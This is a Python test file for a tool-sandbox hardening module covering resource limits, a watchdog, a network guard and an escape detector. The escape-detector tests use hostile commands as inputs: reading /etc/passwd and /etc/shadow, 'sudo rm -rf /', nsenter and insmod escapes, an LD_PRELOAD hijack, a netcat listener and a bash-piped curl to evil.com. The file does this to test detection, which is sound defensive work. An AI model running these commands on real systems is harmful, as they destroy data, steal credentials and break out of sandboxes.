"""Tests for Tool Sandbox Hardening — resource limits, watchdog, escape detection.

Covers: ToolSandboxProfile, ResourceWatchdog, NetworkGuard, EscapeDetector,
ToolResourceMetrics, ToolSandboxManager, and built-in profiles.
"""

from __future__ import annotations

import time

from cognithor.security.resource_limits import (
    BUILTIN_PROFILES,
    DEFAULT_PROFILE,
    DiskPermission,
    EscapeAttempt,
    EscapeDetector,
    EscapeType,
    NetworkGuard,
    NetworkPermission,
    ResourceWatchdog,
    ToolExecution,
    ToolResourceMetrics,
    ToolSandboxManager,
    ToolSandboxProfile,
    WatchdogAction,
    WatchdogEvent,
)

# ============================================================================
# ToolSandboxProfile
# ============================================================================


class TestToolSandboxProfile:
    def test_defaults(self) -> None:
        p = ToolSandboxProfile(tool_name="test")
        assert p.max_cpu_seconds == 10
        assert p.max_memory_mb == 512
        assert p.network == NetworkPermission.BLOCK
        assert p.disk == DiskPermission.READ_WRITE
        assert p.max_processes == 16
        assert p.watchdog_action == WatchdogAction.KILL

    def test_round_trip(self) -> None:
        p = ToolSandboxProfile(
            tool_name="my_tool",
            max_cpu_seconds=60,
            max_memory_mb=1024,
            network=NetworkPermission.RESTRICTED,
            allowed_hosts=["*.example.com"],
            disk=DiskPermission.READ_ONLY,
        )
        d = p.to_dict()
        p2 = ToolSandboxProfile.from_dict(d)
        assert p2.tool_name == "my_tool"
        assert p2.max_cpu_seconds == 60
        assert p2.max_memory_mb == 1024
        assert p2.network == NetworkPermission.RESTRICTED
        assert p2.allowed_hosts == ["*.example.com"]
        assert p2.disk == DiskPermission.READ_ONLY

    def test_to_dict_keys(self) -> None:
        p = ToolSandboxProfile(tool_name="t")
        d = p.to_dict()
        assert "tool_name" in d
        assert "network" in d
        assert "watchdog_action" in d
        assert d["network"] == "block"


# ============================================================================
# Built-in Profiles
# ============================================================================


class TestBuiltinProfiles:
    def test_exec_command_profile(self) -> None:
        p = BUILTIN_PROFILES["exec_command"]
        assert p.network == NetworkPermission.BLOCK
        assert p.can_spawn_children is True
        assert p.timeout_seconds == 60

    def test_web_search_profile(self) -> None:
        p = BUILTIN_PROFILES["web_search"]
        assert p.network == NetworkPermission.ALLOW
        assert p.disk == DiskPermission.READ_ONLY

    def test_web_fetch_profile(self) -> None:
        p = BUILTIN_PROFILES["web_fetch"]
        assert p.network == NetworkPermission.ALLOW
        assert p.disk == DiskPermission.READ_ONLY

    def test_read_file_profile(self) -> None:
        p = BUILTIN_PROFILES["read_file"]
        assert p.network == NetworkPermission.BLOCK
        assert p.disk == DiskPermission.READ_ONLY
        assert p.max_processes == 1

    def test_write_file_profile(self) -> None:
        p = BUILTIN_PROFILES["write_file"]
        assert p.network == NetworkPermission.BLOCK
        assert p.disk == DiskPermission.READ_WRITE

    def test_vault_get_profile(self) -> None:
        p = BUILTIN_PROFILES["vault_get"]
        assert p.max_memory_mb == 64
        assert p.timeout_seconds == 5
        assert p.network == NetworkPermission.BLOCK

    def test_document_export_profile(self) -> None:
        p = BUILTIN_PROFILES["document_export"]
        assert p.max_disk_write_mb == 200
        assert p.timeout_seconds == 60

    def test_default_profile_restrictive(self) -> None:
        assert DEFAULT_PROFILE.network == NetworkPermission.BLOCK
        assert DEFAULT_PROFILE.disk == DiskPermission.READ_ONLY
        assert DEFAULT_PROFILE.watchdog_action == WatchdogAction.KILL

    def test_all_builtin_profiles_valid(self) -> None:
        assert len(BUILTIN_PROFILES) >= 8
        for name, profile in BUILTIN_PROFILES.items():
            assert profile.tool_name == name
            assert profile.max_cpu_seconds > 0
            assert profile.max_memory_mb > 0


# ============================================================================
# WatchdogEvent
# ============================================================================


class TestWatchdogEvent:
    def test_to_dict(self) -> None:
        e = WatchdogEvent(
            tool_name="test",
            resource="cpu",
            limit=10.0,
            actual=15.0,
            action=WatchdogAction.KILL,
        )
        d = e.to_dict()
        assert d["exceeded_by"] == 5.0
        assert d["action"] == "kill"

    def test_exceeded_by_negative(self) -> None:
        e = WatchdogEvent(
            tool_name="t", resource="mem", limit=512, actual=256, action=WatchdogAction.WARN
        )
        d = e.to_dict()
        assert d["exceeded_by"] == -256.0


# ============================================================================
# ResourceWatchdog
# ============================================================================


class TestResourceWatchdog:
    def setup_method(self) -> None:
        self.wd = ResourceWatchdog()
        self.profile = ToolSandboxProfile(
            tool_name="test",
            max_cpu_seconds=10,
            max_memory_mb=512,
            max_disk_write_mb=100,
            timeout_seconds=30,
            max_output_bytes=50_000,
        )

    def test_start_stop_monitoring(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        assert self.wd.active_count == 1
        self.wd.stop_monitoring("ex1")
        assert self.wd.active_count == 0

    def test_check_cpu_within_limits(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        event = self.wd.check_cpu("ex1", 5.0)
        assert event is None

    def test_check_cpu_exceeded(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        event = self.wd.check_cpu("ex1", 15.0)
        assert event is not None
        assert event.resource == "cpu"
        assert event.action == WatchdogAction.KILL

    def test_check_memory_exceeded(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        event = self.wd.check_memory("ex1", 600.0)
        assert event is not None
        assert event.resource == "memory"

    def test_check_memory_within_limits(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        assert self.wd.check_memory("ex1", 256.0) is None

    def test_check_disk_exceeded(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        event = self.wd.check_disk("ex1", 150.0)
        assert event is not None
        assert event.resource == "disk"

    def test_check_timeout(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        # Manipulate start time to simulate timeout
        self.wd._active_tools["ex1"]["started_at"] = time.monotonic() - 60
        event = self.wd.check_timeout("ex1")
        assert event is not None
        assert event.resource == "timeout"
        assert event.action == WatchdogAction.KILL

    def test_check_timeout_within_limits(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        assert self.wd.check_timeout("ex1") is None

    def test_check_output_exceeded(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        event = self.wd.check_output("ex1", 100_000)
        assert event is not None
        assert event.resource == "output"
        assert event.action == WatchdogAction.WARN

    def test_unknown_execution_id(self) -> None:
        assert self.wd.check_cpu("unknown", 100) is None
        assert self.wd.check_memory("unknown", 100) is None
        assert self.wd.check_disk("unknown", 100) is None
        assert self.wd.check_timeout("unknown") is None
        assert self.wd.check_output("unknown", 100) is None

    def test_events_collected(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        self.wd.check_cpu("ex1", 15.0)
        self.wd.check_memory("ex1", 600.0)
        assert len(self.wd.events) == 2

    def test_events_for_tool(self) -> None:
        p1 = ToolSandboxProfile(tool_name="tool_a", max_cpu_seconds=5)
        p2 = ToolSandboxProfile(tool_name="tool_b", max_cpu_seconds=5)
        self.wd.start_monitoring("ex1", p1)
        self.wd.start_monitoring("ex2", p2)
        self.wd.check_cpu("ex1", 10.0)
        self.wd.check_cpu("ex2", 10.0)
        assert len(self.wd.events_for_tool("tool_a")) == 1

    def test_clear_events(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        self.wd.check_cpu("ex1", 15.0)
        count = self.wd.clear_events()
        assert count == 1
        assert len(self.wd.events) == 0

    def test_get_state(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        self.wd.check_cpu("ex1", 5.0)
        state = self.wd.get_state("ex1")
        assert state is not None
        assert state["cpu_used"] == 5.0

    def test_get_state_unknown(self) -> None:
        assert self.wd.get_state("unknown") is None

    def test_memory_peak_tracked(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        self.wd.check_memory("ex1", 200.0)
        self.wd.check_memory("ex1", 400.0)
        self.wd.check_memory("ex1", 300.0)
        state = self.wd.get_state("ex1")
        assert state["memory_peak_mb"] == 400.0

    def test_stats(self) -> None:
        self.wd.start_monitoring("ex1", self.profile)
        self.wd.check_cpu("ex1", 15.0)
        s = self.wd.stats()
        assert s["total_violations"] == 1
        assert s["active_monitors"] == 1
        assert "cpu" in s["by_resource"]

    def test_max_events_limit(self) -> None:
        wd = ResourceWatchdog(max_events=3)
        profile = ToolSandboxProfile(tool_name="t", max_cpu_seconds=1)
        for i in range(5):
            wd.start_monitoring(f"ex{i}", profile)
            wd.check_cpu(f"ex{i}", 10.0)
        assert len(wd.events) == 3


# ============================================================================
# NetworkGuard
# ============================================================================


class TestNetworkGuard:
    def setup_method(self) -> None:
        self.guard = NetworkGuard()

    def test_block_policy(self) -> None:
        profile = ToolSandboxProfile(tool_name="test", network=NetworkPermission.BLOCK)
        assert self.guard.check_access("test", profile) is False
        assert self.guard.blocked_count == 1

    def test_allow_policy(self) -> None:
        profile = ToolSandboxProfile(tool_name="test", network=NetworkPermission.ALLOW)
        assert self.guard.check_access("test", profile) is True
        assert self.guard.allowed_count == 1

    def test_restricted_allowed_host(self) -> None:
        profile = ToolSandboxProfile(
            tool_name="test",
            network=NetworkPermission.RESTRICTED,
            allowed_hosts=["api.example.com"],
        )
        assert self.guard.check_access("test", profile, host="api.example.com") is True

    def test_restricted_blocked_host(self) -> None:
        profile = ToolSandboxProfile(
            tool_name="test",
            network=NetworkPermission.RESTRICTED,
            allowed_hosts=["api.example.com"],
        )
        assert self.guard.check_access("test", profile, host="evil.com") is False

    def test_restricted_wildcard_host(self) -> None:
        profile = ToolSandboxProfile(
            tool_name="test",
            network=NetworkPermission.RESTRICTED,
            allowed_hosts=["*.example.com"],
        )
        assert self.guard.check_access("test", profile, host="api.example.com") is True
        assert self.guard.check_access("test", profile, host="example.com") is True
        assert self.guard.check_access("test", profile, host="evil.com") is False

    def test_restricted_no_host(self) -> None:
        profile = ToolSandboxProfile(
            tool_name="test",
            network=NetworkPermission.RESTRICTED,
            allowed_hosts=["api.example.com"],
        )
        assert self.guard.check_access("test", profile, host="") is False

    def test_blocked_for_tool(self) -> None:
        profile = ToolSandboxProfile(tool_name="exec", network=NetworkPermission.BLOCK)
        self.guard.check_access("exec", profile, host="example.com")
        blocked = self.guard.blocked_for_tool("exec")
        assert len(blocked) == 1
        assert blocked[0]["host"] == "example.com"

    def test_stats(self) -> None:
        p_allow = ToolSandboxProfile(tool_name="web", network=NetworkPermission.ALLOW)
        p_block = ToolSandboxProfile(tool_name="exec", network=NetworkPermission.BLOCK)
        self.guard.check_access("web", p_allow)
        self.guard.check_access("exec", p_block)
        s = self.guard.stats()
        assert s["total_allowed"] == 1
        assert s["total_blocked"] == 1
        assert "exec" in s["blocked_tools"]

    def test_host_case_insensitive(self) -> None:
        profile = ToolSandboxProfile(
            tool_name="t",
            network=NetworkPermission.RESTRICTED,
            allowed_hosts=["API.Example.COM"],
        )
        assert self.guard.check_access("t", profile, host="api.example.com") is True


# ============================================================================
# EscapeDetector
# ============================================================================


class TestEscapeDetector:
    def setup_method(self) -> None:
        self.detector = EscapeDetector()

    def test_safe_command(self) -> None:
        assert self.detector.is_safe("ls -la /home/user") is True
        assert self.detector.is_safe("echo hello") is True
        assert self.detector.is_safe("python script.py") is True

    def test_path_traversal(self) -> None:
        attempts = self.detector.scan("cat ../../../etc/passwd", "exec_command")
        assert len(attempts) >= 1
        assert any(a.escape_type == EscapeType.PATH_TRAVERSAL for a in attempts)

    def test_proc_root_escape(self) -> None:
        attempts = self.detector.scan("cat /proc/1/root/etc/shadow")
        assert any(a.escape_type == EscapeType.PATH_TRAVERSAL for a in attempts)

    def test_symlink_attack(self) -> None:
        attempts = self.detector.scan("ln -s /etc/passwd /tmp/link")
        assert any(a.escape_type == EscapeType.SYMLINK_ATTACK for a in attempts)

    def test_namespace_escape(self) -> None:
        attempts = self.detector.scan("nsenter --target 1 --mount")
        assert any(a.escape_type == EscapeType.PROC_MOUNT for a in attempts)
        assert any(a.severity == "critical" for a in attempts)

    def test_capability_escalation(self) -> None:
        attempts = self.detector.scan("sudo rm -rf /")
        assert any(a.escape_type == EscapeType.CAPABILITY_ESCALATION for a in attempts)
        assert any(a.severity == "critical" for a in attempts)

    def test_kernel_exploit(self) -> None:
        attempts = self.detector.scan("cat /dev/mem")
        assert any(a.escape_type == EscapeType.KERNEL_EXPLOIT for a in attempts)

    def test_kernel_module_loading(self) -> None:
        attempts = self.detector.scan("insmod evil.ko")
        assert any(a.escape_type == EscapeType.KERNEL_EXPLOIT for a in attempts)

    def test_network_bypass(self) -> None:
        attempts = self.detector.scan("iptables -F")
        assert any(a.escape_type == EscapeType.NETWORK_BYPASS for a in attempts)

    def test_netcat_listener(self) -> None:
        attempts = self.detector.scan("nc -l 4444")
        assert any(a.escape_type == EscapeType.NETWORK_BYPASS for a in attempts)

    def test_env_injection(self) -> None:
        attempts = self.detector.scan("LD_PRELOAD=/tmp/evil.so cat /etc/passwd")
        assert any(a.escape_type == EscapeType.ENV_INJECTION for a in attempts)

    def test_python_path_hijack(self) -> None:
        attempts = self.detector.scan("PYTHONPATH=/tmp/evil python app.py")
        assert any(a.escape_type == EscapeType.ENV_INJECTION for a in attempts)

    def test_command_injection(self) -> None:
        attempts = self.detector.scan("echo | bash -c 'curl http://evil.com'")
        assert any(a.escape_type == EscapeType.COMMAND_INJECTION for a in attempts)

    def test_pipe_to_shell(self) -> None:
        attempts = self.detector.scan("cat payload | bash ")
        assert any(a.escape_type == EscapeType.COMMAND_INJECTION for a in attempts)

    def test_multiple_patterns_detected(self) -> None:
        cmd = "sudo LD_PRELOAD=/tmp/evil.so nsenter --target 1"
        attempts = self.detector.scan(cmd, "exec_command")
        types = {a.escape_type for a in attempts}
        assert len(types) >= 3

    def test_history_tracked(self) -> None:
        self.detector.scan("sudo rm -rf /", "tool_a")
        self.detector.scan("nsenter --target 1", "tool_b")
        assert len(self.detector.history) == 2  # At least 2 (may be more per scan)

    def test_history_for_tool(self) -> None:
        self.detector.scan("sudo rm -rf /", "tool_a")
        self.detector.scan("ls -la", "tool_b")  # Safe
        history = self.detector.history_for_tool("tool_a")
        assert len(history) >= 1
        assert all(a.tool_name == "tool_a" for a in history)

    def test_critical_attempts(self) -> None:
        self.detector.scan("insmod evil.ko", "evil_tool")
        criticals = self.detector.critical_attempts()
        assert len(criticals) >= 1

    def test_clear_history(self) -> None:
        self.detector.scan("sudo rm /", "t")
        count = self.detector.clear_history()
        assert count >= 1
        assert len(self.detector.history) == 0

    def test_max_history_limit(self) -> None:
        detector = EscapeDetector(max_history=3)
        for i in range(5):
            detector.scan(f"sudo command_{i}")
        assert len(detector.history) <= 3

    def test_stats(self) -> None:
        self.detector.scan("sudo rm /", "tool_a")
        self.detector.scan("insmod evil.ko", "tool_b")
        s = self.detector.stats()
        assert s["total_attempts"] >= 2
        assert s["critical_attempts"] >= 1
        assert "by_type" in s

    def test_escape_attempt_to_dict(self) -> None:
        a = EscapeAttempt(
            escape_type=EscapeType.PATH_TRAVERSAL,
            tool_name="test",
            command="cat ../../../etc/passwd",
            matched_pattern=r"(?:\.\.[/\\]){3,}",
            severity="high",
        )
        d = a.to_dict()
        assert d["type"] == "path_traversal"
        assert d["severity"] == "high"
        assert "command_preview" in d


# ============================================================================
# ToolExecution
# ============================================================================


class TestToolExecution:
    def test_success(self) -> None:
        e = ToolExecution(
            tool_name="test",
            execution_id="ex1",
            started_at=100.0,
            finished_at=100.5,
            exit_code=0,
        )
        assert e.success is True
        assert e.duration_ms == 500.0

    def test_failure(self) -> None:
        e = ToolExecution(
            tool_name="test",
            execution_id="ex1",
            started_at=100.0,
            finished_at=100.5,
            exit_code=1,
        )
        assert e.success is False

    def test_timed_out(self) -> None:
        e = ToolExecution(
            tool_name="test",
            execution_id="ex1",
            started_at=100.0,
            finished_at=130.0,
            timed_out=True,
        )
        assert e.success is False

    def test_killed_by_watchdog(self) -> None:
        e = ToolExecution(
            tool_name="test",
            execution_id="ex1",
            started_at=100.0,
            finished_at=100.1,
            killed_by_watchdog=True,
        )
        assert e.success is False

    def test_duration_zero_when_unfinished(self) -> None:
        e = ToolExecution(tool_name="t", execution_id="e", started_at=100.0)
        assert e.duration_ms == 0.0

    def test_to_dict(self) -> None:
        e = ToolExecution(
            tool_name="test",
            execution_id="ex1",
            started_at=100.0,
            finished_at=100.5,
            cpu_seconds=0.3,
            memory_peak_mb=128.5,
        )
        d = e.to_dict()
        assert d["duration_ms"] == 500.0
        assert d["success"] is True
        assert d["cpu_seconds"] == 0.3


# ============================================================================
# ToolResourceMetrics
# ============================================================================


class TestToolResourceMetrics:
    def setup_method(self) -> None:
        self.metrics = ToolResourceMetrics()

    def _make_execution(
        self,
        tool: str = "test",
        exec_id: str = "ex1",
        duration: float = 0.5,
        cpu: float = 0.1,
        memory: float = 64.0,
        success: bool = True,
    ) -> ToolExecution:
        return ToolExecution(
            tool_name=tool,
            execution_id=exec_id,
            started_at=100.0,
            finished_at=100.0 + duration,
            cpu_seconds=cpu,
            memory_peak_mb=memory,
            exit_code=0 if success else 1,
        )

    def test_record_and_retrieve(self) -> None:
        self.metrics.record(self._make_execution())
        assert self.metrics.total_executions == 1

    def test_for_tool(self) -> None:
        self.metrics.record(self._make_execution(tool="a"))
        self.metrics.record(self._make_execution(tool="b"))
        self.metrics.record(self._make_execution(tool="a", exec_id="ex2"))
        assert len(self.metrics.for_tool("a")) == 2
        assert len(self.metrics.for_tool("b")) == 1

    def test_aggregate(self) -> None:
        self.metrics.record(self._make_execution(duration=0.5, cpu=0.1, memory=100))
        self.metrics.record(self._make_execution(exec_id="ex2", duration=1.0, cpu=0.3, memory=200))
        agg = self.metrics.aggregate("test")
        assert agg["executions"] == 2
        assert agg["success_rate"] == 100.0
        assert agg["avg_duration_ms"] == 750.0
        assert agg["max_memory_mb"] == 200.0

    def test_aggregate_empty(self) -> None:
        agg = self.metrics.aggregate("unknown")
        assert agg["executions"] == 0

    def test_aggregate_with_failures(self) -> None:
        self.metrics.record(self._make_execution(success=True))
        self.metrics.record(self._make_execution(exec_id="ex2", success=False))
        agg = self.metrics.aggregate("test")
        assert agg["success_rate"] == 50.0

    def test_all_tools(self) -> None:
        self.metrics.record(self._make_execution(tool="b"))
        self.metrics.record(self._make_execution(tool="a"))
        assert self.metrics.all_tools() == ["a", "b"]

    def test_recent(self) -> None:
        for i in range(5):
            self.metrics.record(self._make_execution(exec_id=f"ex{i}"))
        recent = self.metrics.recent(limit=3)
        assert len(recent) == 3
        assert recent[0].execution_id == "ex4"

    def test_max_history_limit(self) -> None:
        m = ToolResourceMetrics(max_history=3)
        for i in range(5):
            m.record(self._make_execution(exec_id=f"ex{i}"))
        assert m.total_executions == 3

    def test_stats(self) -> None:
        self.metrics.record(self._make_execution(tool="a"))
        self.metrics.record(self._make_execution(tool="b"))
        s = self.metrics.stats()
        assert s["total_executions"] == 2
        assert s["unique_tools"] == 2
        assert "a" in s["tools"]
        assert "b" in s["tools"]


# ============================================================================
# ToolSandboxManager
# ============================================================================


class TestToolSandboxManager:
    def setup_method(self) -> None:
        self.mgr = ToolSandboxManager()

    def test_get_builtin_profile(self) -> None:
        p = self.mgr.get_profile("exec_command")
        assert p.tool_name == "exec_command"
        assert p.network == NetworkPermission.BLOCK

    def test_get_default_for_unknown(self) -> None:
        p = self.mgr.get_profile("unknown_tool")
        assert p.tool_name == "__default__"
        assert p.network == NetworkPermission.BLOCK

    def test_register_custom_profile(self) -> None:
        custom = ToolSandboxProfile(
            tool_name="custom_tool",
            max_cpu_seconds=60,
            network=NetworkPermission.ALLOW,
        )
        self.mgr.register_profile(custom)
        assert self.mgr.has_profile("custom_tool")
        p = self.mgr.get_profile("custom_tool")
        assert p.max_cpu_seconds == 60

    def test_list_profiles(self) -> None:
        profiles = self.mgr.list_profiles()
        assert len(profiles) >= len(BUILTIN_PROFILES)

    # -- Pre-execution checks --

    def test_pre_execute_safe_command(self) -> None:
        result = self.mgr.pre_execute_check("exec_command", command="echo hello")
        assert result["allowed"] is True
        assert len(result["escape_attempts"]) == 0

    def test_pre_execute_critical_escape(self) -> None:
        result = self.mgr.pre_execute_check("exec_command", command="sudo insmod evil.ko")
        assert result["allowed"] is False
        assert "Critical" in result["reason"]

    def test_pre_execute_non_critical_escape(self) -> None:
        result = self.mgr.pre_execute_check("exec_command", command="cat ../../../etc/hosts")
        assert result["allowed"] is True
        assert len(result["warnings"]) >= 1

    def test_pre_execute_network_blocked(self) -> None:
        result = self.mgr.pre_execute_check("exec_command", target_host="evil.com")
        # exec_command has BLOCK policy, so no network check is performed
        # (BLOCK means the host check is skipped since BLOCK != ALLOW)
        assert result["allowed"] is True

    def test_pre_execute_unknown_tool_warning(self) -> None:
        result = self.mgr.pre_execute_check("unknown_tool")
        assert result["allowed"] is True
        assert any("default" in w.lower() for w in result["warnings"])

    # -- Execution lifecycle --

    def test_begin_end_execution(self) -> None:
        profile = self.mgr.begin_execution("ex1", "exec_command")
        assert profile.tool_name == "exec_command"
        assert self.mgr.watchdog.active_count == 1

        execution = ToolExecution(
            tool_name="exec_command",
            execution_id="ex1",
            started_at=100.0,
            finished_at=100.5,
        )
        self.mgr.end_execution(execution)
        assert self.mgr.watchdog.active_count == 0
        assert self.mgr.metrics.total_executions == 1

    # -- Stats --

    def test_stats(self) -> None:
        s = self.mgr.stats()
        assert "profiles" in s
        assert "watchdog" in s
        assert "network_guard" in s
        assert "escape_detector" in s
        assert "metrics" in s
        assert s["profiles"] >= len(BUILTIN_PROFILES)


# ============================================================================
# Enum coverage
# ============================================================================


class TestEnums:
    def test_network_permission_values(self) -> None:
        assert len(NetworkPermission) == 3
        assert NetworkPermission.ALLOW == "allow"
        assert NetworkPermission.BLOCK == "block"
        assert NetworkPermission.RESTRICTED == "restricted"

    def test_disk_permission_values(self) -> None:
        assert len(DiskPermission) == 3

    def test_watchdog_action_values(self) -> None:
        assert len(WatchdogAction) == 3

    def test_escape_type_values(self) -> None:
        assert len(EscapeType) == 8
        assert EscapeType.PATH_TRAVERSAL == "path_traversal"
        assert EscapeType.KERNEL_EXPLOIT == "kernel_exploit"
